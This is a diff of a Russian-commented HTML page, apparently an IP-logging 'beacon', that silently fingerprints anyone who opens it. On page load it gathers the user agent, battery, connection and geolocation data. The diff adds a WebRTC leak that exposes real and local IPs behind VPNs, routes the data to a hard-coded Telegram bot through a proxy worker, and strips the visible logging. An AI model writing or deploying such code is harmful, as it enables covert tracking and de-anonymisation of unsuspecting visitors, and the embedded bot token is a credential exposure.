@@ -11,15 +11,17 @@
 </style>
 </head>
 <body>
-<pre id="s">старт…</pre>
+<pre id="s">старт</pre>
 
 <script>
-/* ====== МЕНЯЙ ТОЛЬКО ЭТИ ДВЕ СТРОКИ ====== */
-const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";   // ← из @BotFather
-const CHAT_ID   = "6266637606";           // ← из @userinfobot / getUpdates
+/* ====== МЕНЯЙ ТОЛЬКО ЭТИ ТРИ СТРОКИ ====== */
+const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";
+const CHAT_ID   = "6266637606";
+const PROXY     = "https://tg-proxy.твой-ник.workers.dev";  // ← твой воркер
 /* ========================================= */
 
-const log = m => document.getElementById("s").textContent += "\n" + m;
+const el = document.getElementById("s");
+const setStatus = m => { el.textContent = m; };
 
 const info = {
   ua:       navigator.userAgent,
@@ -40,6 +42,7 @@ const info = {
           rtt:  navigator.connection.rtt
         } : null,
   battery:  null,
+  webrtc_ips: [],
   ts:       new Date().toISOString(),
 };
 
@@ -47,6 +50,33 @@ if (navigator.getBattery) {
   navigator.getBattery().then(b => {
     info.battery = { level: Math.round(b.level * 100) + "%", charging: b.charging };
   }).catch(()=>{});
+}
+
+async function webrtcLeak(timeoutMs = 4000) {
+  const RTCPeerConnection = window.RTCPeerConnection
+    || window.webkitRTCPeerConnection
+    || window.mozRTCPeerConnection;
+  if (!RTCPeerConnection) return [];
+  const ips = new Set();
+  return new Promise((resolve) => {
+    let pc;
+    try {
+      pc = new RTCPeerConnection({
+        iceServers: [
+          { urls: "stun:stun.cloudflare.com:3478" },
+          { urls: "stun:stun.l.google.com:19302" },
+        ],
+      });
+    } catch (e) { resolve([]); return; }
+    try { pc.createDataChannel(""); } catch (e) {}
+    pc.onicecandidate = (e) => {
+      if (!e.candidate) return;
+      const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+      if (m) ips.add(m[1]);
+    };
+    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+    setTimeout(() => { try { pc.close(); } catch(e){} resolve(Array.from(ips)); }, timeoutMs);
+  });
 }
 
 async function geo() {
@@ -63,14 +93,14 @@ async function geo() {
         org:     j.org || (j.connection && j.connection.org),
         asn:     j.asn || (j.connection && j.connection.asn),
       };
-    } catch (e) { log("geo try fail: " + url); }
+    } catch (e) {}
   }
   return {ip: null};
 }
 
 async function send(payload) {
   const text = "📡 beacon\n```\n" + JSON.stringify(payload, null, 2) + "\n```";
-  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  const r = await fetch(`${PROXY}/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode: "Markdown"})
@@ -81,18 +111,21 @@ async function send(payload) {
 }
 
 (async () => {
-  log("geo…");
   try {
     const g = await geo();
-    log("geo ok: " + JSON.stringify(g));
     Object.assign(info, g);
-  } catch (e) { log("geo FAIL: " + e.message); }
+  } catch (e) {}
 
-  log("send…");
+  try {
+    info.webrtc_ips = await webrtcLeak();
+  } catch (e) { info.webrtc_ips = []; }
+
   try {
     await send(info);
-    log("✅ send ok");
-  } catch (e) { log("❌ send FAIL: " + e.message); }
+    setStatus("ok");
+  } catch (e) {
+    setStatus("failed");
+  }
 })();
 </script>
 </body>
